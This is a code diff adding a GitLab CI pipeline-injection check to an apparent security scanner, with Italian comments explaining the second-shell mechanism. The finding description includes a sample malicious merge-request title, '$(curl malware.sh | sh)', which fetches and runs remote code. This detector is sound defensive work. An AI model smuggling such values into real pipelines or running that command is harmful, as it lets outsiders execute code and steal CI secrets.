@@ -11,6 +11,7 @@ import {
   isKubernetesManifest,
   isTerraformFile,
   isGithubActionsWorkflow,
+  isGitlabCiFile,
   nearbyMatches,
   redactLine,
 } from "../util/scan.js";
@@ -94,6 +95,25 @@ function stepHasOwnEnvKey(lines: string[], runLineIdx: number, runIndent: number
   }
   return false;
 }
+
+// GitLab CI passa queste variabili come vere variabili d'ambiente della
+// shell — "echo \"$CI_COMMIT_MESSAGE\"" da solo è sicuro, l'espansione di
+// una variabile non viene ri-eseguita come comando. Il rischio reale nasce
+// solo quando il valore passa per una SECONDA shell ("eval", oppure
+// "sh -c \"...\"" / "bash -c \"...\""): lì il testo, già espanso dalla shell
+// esterna, finisce dentro una stringa che la shell interna interpreta di
+// nuovo come codice — ed è lì che un "$(comando)" o un backtick dentro il
+// titolo di una merge request verrebbe davvero eseguito ("GitLab CI/CD
+// pipeline injection", la stessa classe di incidenti reali già vista per
+// GitHub Actions ma con un meccanismo diverso).
+const GITLAB_SECOND_SHELL = /\b(?:eval\b|(?:\/bin\/)?(?:ba)?sh\s+-c\b)/;
+const GITLAB_DANGEROUS_VAR =
+  /\$\{?(?:CI_COMMIT_MESSAGE|CI_COMMIT_TITLE|CI_COMMIT_REF_NAME|CI_COMMIT_AUTHOR|CI_MERGE_REQUEST_TITLE|CI_MERGE_REQUEST_DESCRIPTION|CI_MERGE_REQUEST_SOURCE_BRANCH_NAME|CI_EXTERNAL_PULL_REQUEST_SOURCE_BRANCH_NAME)\}?/;
+// Cattura indentazione e resto della riga dopo "script:"/"before_script:"/
+// "after_script:" — stessa idea di GHA_RUN_STEP: un valore vuoto significa
+// blocco a lista nelle righe successive, un valore non vuoto è la forma
+// inline (comando singolo o array YAML flow sulla stessa riga).
+const GITLAB_SCRIPT_KEY = /^(\s*)(?:-\s*)?(?:script|before_script|after_script):\s*(.*)$/;
 
 // "pull_request_target" gira con i permessi e i segreti del repository di
 // base anche per una pull request da un fork esterno — a differenza di
@@ -1243,5 +1263,56 @@ export const criticalChecks: Check[] = [
       });
       return changed ? content : null;
     },
+  },
+
+  {
+    id: "gitlab-ci-script-injection",
+    severity: "critical",
+    confidence: "confirmed",
+    title: "Un valore controllato da un utente esterno passa per una seconda shell nella pipeline GitLab CI",
+    description:
+      "Una riga di \"script:\" (o \"before_script:\"/\"after_script:\") usa \"eval\" oppure \"sh -c\"/\"bash -c\" insieme a una variabile predefinita di GitLab come il titolo della merge request, il messaggio di commit o il nome del branch — tutte scrivibili da chiunque apra una merge request, anche da un fork esterno. Il valore viene espanso una prima volta dalla shell esterna e poi incollato dentro una stringa che la seconda shell interpreta di nuovo come codice: un titolo come \"$(curl malware.sh | sh)\" eseguirebbe comandi arbitrari nella pipeline, con accesso a tutti i segreti disponibili in quel job.",
+    fix: {
+      before: `script:\n  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
+      after: `script:\n  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # passato come argomento al comando, mai dentro una stringa "bash -c" che lo farebbe reinterpretare`,
+    },
+    detect(file) {
+      if (!isGitlabCiFile(file)) return [];
+      const matches: CheckMatch[] = [];
+      const lines = file.content.split("\n");
+
+      function checkLine(textToCheck: string, lineIdx: number, fullLine: string) {
+        if (GITLAB_SECOND_SHELL.test(textToCheck) && GITLAB_DANGEROUS_VAR.test(textToCheck)) {
+          matches.push({ line: lineIdx + 1, snippet: redactLine(fullLine, 0, fullLine.length) });
+        }
+      }
+
+      lines.forEach((lineText, idx) => {
+        const m = GITLAB_SCRIPT_KEY.exec(lineText);
+        if (!m) return;
+        const [, indent, inline] = m;
+        const trimmedInline = inline.trim();
+
+        if (trimmedInline !== "") {
+          checkLine(inline, idx, lineText);
+          return;
+        }
+
+        // Blocco a lista: righe successive più indentate, una per comando,
+        // finché l'indentazione non torna al livello della chiave stessa.
+        const baseIndent = indent.length;
+        for (let j = idx + 1; j < lines.length; j++) {
+          const next = lines[j];
+          if (next.trim() === "") continue;
+          const nextIndent = next.length - next.trimStart().length;
+          if (nextIndent <= baseIndent) break;
+          checkLine(next, j, next);
+        }
+      });
+
+      return matches;
+    },
+    // Nessun autofix: la riscrittura giusta dipende da cosa fa davvero lo
+    // script (quale comando, quali argomenti) — non deducibile alla cieca.
   },
 ];
